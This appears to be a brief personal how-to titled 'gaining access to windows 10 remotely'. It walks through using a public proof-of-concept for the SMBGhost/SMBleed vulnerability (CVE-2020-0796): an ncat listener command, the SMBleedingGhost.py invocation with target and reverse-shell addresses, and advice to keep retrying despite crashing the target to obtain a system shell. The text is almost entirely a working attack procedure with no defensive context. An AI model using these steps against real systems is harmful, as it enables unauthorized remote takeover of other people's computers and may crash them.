gaining access to windows 10 remotely
1) download tools
https://github.com/ZecOps/CVE-2020-0796-RCE-POC


    Make sure Python and ncat are installed.

    Run calc_target_offsets.bat on the target computer, and adjust the offsets at the top of the SMBleedingGhost.py file according to the script output (also see the note below).

    Run ncat with the following command line arguments:

    ncat -lvp <port>
	nc -lvp port==listener

    Where <port> is the port number ncat will be listening on.

    Run SMBleedingGhost.py with the following command line arguments:

    SMBleedingGhost.py <target_ip> <reverse_shell_ip> <reverse_shell_port>

Where <target_ip> is the IP address of the target, vulnerable computer. <reverse_shell_ip> and <reverse_shell_port> are the IP address and the port number ncat is listening on.
If all goes well, ncat will display a shell that provides system access to the target computer.

exploit can only be run on windows machine then listened to on kali
exploit might crash the target machine a couple times but keep trying for a shell
